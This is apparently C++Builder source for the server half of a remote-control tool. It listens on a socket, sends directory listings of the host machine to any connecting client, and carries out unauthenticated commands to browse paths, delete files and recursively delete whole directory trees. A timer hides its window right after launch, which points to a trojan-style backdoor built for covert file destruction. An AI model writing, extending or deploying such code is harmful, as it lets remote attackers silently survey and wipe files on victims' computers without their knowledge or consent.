//---------------------------------------------------------------------------

#include <vcl.h>
#pragma hdrstop

#include "Unit2.h"
//---------------------------------------------------------------------------
#pragma package(smart_init)
#pragma resource "*.dfm"
TForm2 *Form2;
AnsiString filedir1="C:";
int receivesize,fullsize,downsize;
AnsiString set_data,set_filedir;
//---------------------------------------------------------------------------
__fastcall TForm2::TForm2(TComponent* Owner)
    : TForm(Owner)
{
}
//---------------------------------------------------------------------------

void __fastcall TForm2::DeleteTree(AnsiString stDir)
{
    TSearchRec st;
    if(FindFirst(stDir+"\\*.*", faDirectory, st) == 0)
    {
        do
        {
	        if(st.Name != "." && st.Name !="..")
	        {
                if(st.Attr == 16 || st.Attr == 17 && st.Size == 0)
                {
                    DeleteTree(stDir+"\\"+st.Name);
                    RemoveDir(stDir);
                }
                else
                {
                    DeleteFile(stDir+"\\"+st.Name);
                }
            }
        }
        while(FindNext(st) == 0);
    }
    FindClose(st);
    RemoveDir(stDir);
}
//---------------------------------------------------------------------------
void __fastcall TForm2::FormShow(TObject *Sender)
{
    TSearchRec sr;
    ListBox1->Clear();
    ListBox2->Clear();
    if(FindFirst("C:\\*.*", faAnyFile, sr) == 0)
    {
        do
        {
            if(sr.Attr == 16 || sr.Attr == 17 && sr.Size == 0)
            {
                ListBox1->Items->Add(sr.Name);
            }
            else
            {
                ListBox2->Items->Add(sr.Name);
            }
        }
        while(FindNext(sr) == 0);
    }
    FindClose(sr);
}
//---------------------------------------------------------------------------

void __fastcall TForm2::ServerSocket1ClientConnect(TObject *Sender,
      TCustomWinSocket *Socket)
{
    Socket->SendText("_listup_"+ListBox1->Items->Text+"#"+ListBox2->Items->Text);    
}
//---------------------------------------------------------------------------
void __fastcall TForm2::ServerSocket1ClientError(TObject *Sender,
      TCustomWinSocket *Socket, TErrorEvent ErrorEvent, int &ErrorCode)
{
    ErrorCode = 0;    
}
//---------------------------------------------------------------------------
void __fastcall TForm2::ServerSocket1ClientDisconnect(TObject *Sender,
      TCustomWinSocket *Socket)
{
    filedir1="C:";
    TSearchRec sr;
    ListBox1->Clear();
    ListBox2->Clear();
    if(FindFirst("C:\\*.*", faAnyFile, sr) == 0)
    {
        do
        {
            if(sr.Attr == 16 || sr.Attr == 17 && sr.Size == 0)
            {
                ListBox1->Items->Add(sr.Name);
            }
            else
            {
                ListBox2->Items->Add(sr.Name);
            }
        }
        while(FindNext(sr) == 0);
    }
    FindClose(sr);
}
//---------------------------------------------------------------------------
void __fastcall TForm2::ServerSocket1ClientRead(TObject *Sender,
      TCustomWinSocket *Socket)
{
    AnsiString text = Socket->ReceiveText();
    if(text.Pos("_dirup_"))
    {
        text.Delete(1,7);
        TSearchRec sr;
        ListBox1->Clear();
        ListBox2->Clear();
        if(FindFirst(text+"\\*.*", faAnyFile, sr) == 0)
        {
            do
            {
                if(sr.Attr == 16 || sr.Attr == 17 && sr.Size == 0)
                {
                    ListBox1->Items->Add(sr.Name);
                }
                else
                {
                    ListBox2->Items->Add(sr.Name);
                }
            }
            while(FindNext(sr) == 0);
        }
        Socket->SendText("_listup_"+ListBox1->Items->Text+"#"+ListBox2->Items->Text);
    }
    else if(text.Pos("_filekill_"))
    {
        text.Delete(1,10);
        DeleteFile(text);
    }
    else if(text.Pos("_dirkill_"))
    {
        text.Delete(1,9);
        DeleteTree(text);
    }
}
//---------------------------------------------------------------------------

void __fastcall TForm2::Timer1Timer(TObject *Sender)
{
    Form2->Hide();
    Timer1->Enabled = false;
    Timer1->Interval = 0;    
}
//---------------------------------------------------------------------------
